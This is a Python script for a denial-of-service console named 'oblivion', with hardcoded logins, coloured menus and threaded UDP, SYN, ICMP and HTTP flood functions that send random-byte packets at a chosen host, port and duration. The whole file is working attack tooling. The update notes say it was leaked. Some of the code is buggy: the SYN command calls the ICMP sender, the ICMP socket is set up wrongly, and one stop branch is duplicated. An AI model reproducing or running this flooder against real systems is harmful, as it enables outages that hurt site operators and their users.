#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[35mATTACK METHODS\033[34m                     ║               
║══════════════════════════════════════════════════════║
║ \033[35mUDP (IP) (PORT) (TIME) (SIZE)  \033[34m|\033[34m UDP Attack.\033[34m         ║
║ \033[34mSYN (IP) (PORT) (TIME) (SIZE)  \033[35m|\033[35m SYN Attack.\033[35m         ║
║ \033[35mICMP (IP) (PORT) (TIME) (SIZE) \033[34m|\033[34m ICMP Attack.\033[34m        ║
║ \033[34mHTTP (IP) (PORT) (TIME) (SIZE) \033[35m|\033[35m HTTP Attack.\033[35m        ║
╚══════════════════════════════════════════════════════╝\033[34m
"""

info = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[34m Info\033[35m                      ║
║══════════════════════════════════════════════════════║
║ \033[34m[+] oblivion Was Made By plasxz.\033[35m                        ║
║ \033[35m[+] Discord: plasxz#7260.\033[34m                             ║
║ \033[34m[+] Instagram: plasxz.\033[35m                             ║
║ \033[35m[+] YouTube: falling time.\033[34m                                  ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

extras = """\033[34m
╔══════════════════════════════════════════════════════╗
║                        \033[35mExtras\033[34m                        ║
║══════════════════════════════════════════════════════║
║ \033[35mattacks          \033[35m|\033[35m Shows How Many Running Attacks.\033[36m   ║
║ \033[34mstop             \033[34m|\033[34m Stops All Running Attacks.\033[35m        ║
║ \033[35mresolve (website) \033[35m|\033[35m Grabs A Domains IP.\033[36m               ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

help = """\033[34m
╔══════════════════════════════════════════════════════╗
║                    \033[35mBasic Commands\033[34m                    ║
║══════════════════════════════════════════════════════║
║ \033[35mmethods \033[34m|\033[35m Shows DDOS Methods For oblivion.\033[35m             ║
║ \033[34mextras  \033[35m|\033[34m Shows Extra Commands For oblivion.\033[34m           ║
║ \033[35mupdates \033[34m|\033[35m Shows Update Notes For oblivion.\033[35m             ║
║ \033[34minfo    \033[35m|\033[34m Shows oblivion Info.\033[34m                         ║
║ \033[35mclear   \033[34m|\033[35m Clears Screen.\033[35m                             ║
║ \033[34mexit    \033[35m|\033[34m Exits Out Of oblivion.\033[34m                       ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

updatenotes = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[34mUpdate Notes\033[35m                     ║
║══════════════════════════════════════════════════════║
║ \033[35m[+] Timeout Bug Fixed.\033[34m                               ║
║ \033[34m[+] Took Out Some Tools.\033[35m                             ║
║ \033[35m[+] User And Pass Changed To oblivion.\033[34m                 ║
║ \033[34m[+] i leaked this.\033[35m    ║
║ \033[35m[+] All Tools Fixed And Working.\033[34m                     ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

banner = """
		┌─┐┌┐ ┬  ┬┬  ┬┬┌─┐┌┐┌
		│ │├┴┐│  │└┐┌┘││ ││││
		└─┘└─┘┴─┘┴ └┘ ┴└─┘┘└┘
                  
"""

cookie = open(".oblivion_Cookie","w+")

fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;oblivion user|owner| plan |9999| servers |32|\x07")
		sin = input("\033[1;35m[\033[34moblivion\033[1;00m]-\033[34m\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "extras":
			print (extras)
			main()
		elif sinput == "exit":
			print ("[\033[34moblivion\033[35m] You Are Exiting Out Of oblivion.\n")
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("[\033[34moblivion\033[35m] Total Attacks Running: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[34moblivion\033[35m] Host: {} \033[34m[\033[35mswapped\033[34m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
			if username == "Guest":
				print ("[\033[34moblivion\033[35m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[35moblivion\033[34m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[35moblivion\033[34m] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[35moblivion\033[34m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("[\033[34moblivion\033[m] Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[35moblivion\033[34m] The Command {} Requires An Argument.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[34moblivion\033[35m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "icmp":
			if username == "Guest":
				print ("[\033[34moblivion\033[35m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[35moblivion\033[34m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[34moblivion\033[35m] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[34moblivion\033[35m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("[\033[34moblivion\033[35m] Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[34moblivion\033[35m] The Command {} Requires An Argument.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[35moblivion\033[34m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "stop":
			print ("[\033[35moblivion\033[34m] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopping All UDP Attacks.\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[34moblivion\033[35m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping All ICMP Attacks.\n")
				icmp = False
				while not icmp:
					print ("[\033[34moblivion\033[35m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[35moblivion\033[34m] {} Is Not A Command.\n".format(sinput))
			main()



try:
	users = ["oblivion", "Guest"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Exiting.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["oblivion", "Guest"]
	password = getpass.getpass ("[+] Password: ")
	if user == "oblivion":
		if password == passwords[0]:
			print ("[+] Login Correct.")
			print ("[+] Type Help To See Commands.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[35moblivion\033[34m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
	if user == "Guest":
		if password == passwords[1]:
			print ("[+] Login Correct.")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Type Help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[35moblivion\033[34m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
except KeyboardInterrupt:
	exit()